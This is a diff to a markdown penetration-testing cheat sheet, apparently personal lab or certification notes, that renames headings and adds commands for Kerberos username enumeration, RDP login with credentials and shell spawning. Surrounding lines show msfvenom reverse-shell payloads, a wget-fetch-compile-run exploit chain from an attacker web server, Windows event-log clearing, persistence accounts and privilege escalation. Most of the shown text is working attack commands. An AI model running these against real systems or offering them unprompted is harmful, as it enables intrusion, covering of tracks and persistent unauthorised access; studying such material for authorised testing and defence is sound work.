@@ -76,7 +76,7 @@
         - `nmap -A -T4 <ip>`
         - `nmap -A -<ip>`
 
-### [ENUMERATING & FOOTPRINTING SERVICES](#)
+### [ENUMERATING & EXPLOITING SERVICES](#)
 
 #### **General Web Recon**
 
@@ -495,7 +495,7 @@ smb: \> mget *
 
 - Connecting RDP
     - `xfreerdp /u:administrator /p:qwertyuiop /v:10.5.31.78:3333`
-
+    - `rdesktop -u 'bitbucket' -p 'littleredbucket' 10.10.125.136:3389`
 
 
 #### WinRM
@@ -513,6 +513,21 @@ smb: \> mget *
 
 ##### Enumeration
 
+###### Basic Enumeration
+
+-  Kerberos 
+    - `nmap 10.10.90.60 -p 88 --open`
+
+###### Username Enumeration
+    
+- In case we have read access on IPC$ share
+    - since we have read access on IPC$, we can enumerate users either by using crackmapexec , or impacket-lookupsid.py . for now, I will be using impacket-lookupsid.py
+    - `impacket-lookupsid 'guest'@10.10.130.255`
+    - `impacket-lookupsid 'guest'@10.10.130.255 | cut -d " " -f 2 > usernames.txt`
+    - `crackmapexec smb  10.10.130.255 -u 'guest' -p '' --users`
+
+- Confirm user exists by crackmapexec
+
 ##### Exploitation
 ###### Kerberosting
 
@@ -524,7 +539,7 @@ smb: \> mget *
 
 
 
-### [Brute Forcing](#)
+### [BRUTE FORCING](#)
 
 #### **Hydra**
 
@@ -582,8 +597,15 @@ smb: \> mget *
 
 
 
-### [Payloads, shells and Listeners](#)
+### [PALOADS, SHELLS & LISTENERS](#)
 
+#### Spawn shells
+
+- `python -c 'import pty; pty.spawn("/bin/sh")'`
+
+- `echo os.system('/bin/bash')`
+
+- `/bin/sh -i`
 
 #### Reverse shells
 
@@ -602,7 +624,7 @@ smb: \> mget *
         - Jenkins Script Console
 
 
-##### Msfvenom 
+##### Msfvenom (staged meterpreter binaries)
 - asp
     - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234 -f asp > shell.asp`
 
@@ -640,7 +662,7 @@ smb: \> mget *
     - `evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211` 
 
 
-#### Meterpreter Shell
+### [METERPRETER](#)
 
 - Windows Enumeration
     - `sysinfo`, `getuid`, `getpid`, `getprivs`, `ps`, `pgrep <process_name>`, `shell`
@@ -682,11 +704,7 @@ NOTE - There is more advanced need to be checked from
 https://fuzzysecurity.com/tutorials/16.html, 
 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#internet-settings
 
-
-#### Spawning shell
-- Python
-    - `python -c 'import pty; pty.spawn("/bin/sh")'`
-
+### [STEGANOGRAPHY](#)
 
 #### **Injection of payload in executables**
 
@@ -707,7 +725,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
         - `notepad windowslogs.txt `
         - `del Payload.exe ` 
 
-### [Payload Transfer Techniques](#)
+### [PAYLOAD TRANSFER TECHNIQUES](#)
 
 - Using Netcat
     - We need to have netcat listerner on target machine with `>` so whatever werecieve get stored in `'test.txt`
@@ -794,7 +812,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
     - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`
     
 
-### [Windows Post Exploitation Enumeration](#)
+### [WINDOWS POST EEXPLOITATION ENUMERATION](#)
 
 **Operating System Enumeration**
 
@@ -902,7 +920,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
 
 
-### [Windows Privilege Escalation](#)
+### [WINDOWS PRIVILEGE ESCALATION](#)
 
 #### Find Possible Privilege Escalation**
 ###### Exploit Suggestor
@@ -947,7 +965,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
     - this attack generates access token for you, instead of impersonating
 
 
-### [Clearing Tracks](#)
+### [CLEARING TRACKS](#)
 
 **Clearing artifacts using metasploit `Resource Scripts`**
 ```
@@ -966,7 +984,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
 **Clearing Windows Event Logs usng meterpreter**
 - `clearev`
 
-### [Windows Persistence](#)
+### [WINDOWS PERSISTENCE](#)
 
 **Persistence by RDP (GUI based access) or WinRM (CLI based access)**
 - Requirements: We need either RDP (3389) or Winrm (5985) port open on target
@@ -1000,7 +1018,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
                 - `run getgui -e -u user123 -p hacker_123321`
 
 
-### [Metasploit](#)
+### [METASPLOIT](#)
 
 - Starting / Troubleshooting DB
     - `sudo service postgresql start`
@@ -1027,7 +1045,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
 
 
 
-### [Linux Post Exploit Enumeration](#)
+### [LINUX POST EXPLOIT ENUMERATION](#)
 
 **Break out of Jail shell first**
     - `/bin/bash -i`
@@ -1135,7 +1153,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
     - (miscondifured DNS server may be vulnerble to `DNS Zone Transfer attacks`)
     - `/etc/resolve.conf`
 
-### [Linux Privilege Escalation](#)
+### [LINUX PRIVILEGE ESCALATION](#)
 
 ###
 **Privilege Escalation by Kernel Exploits**
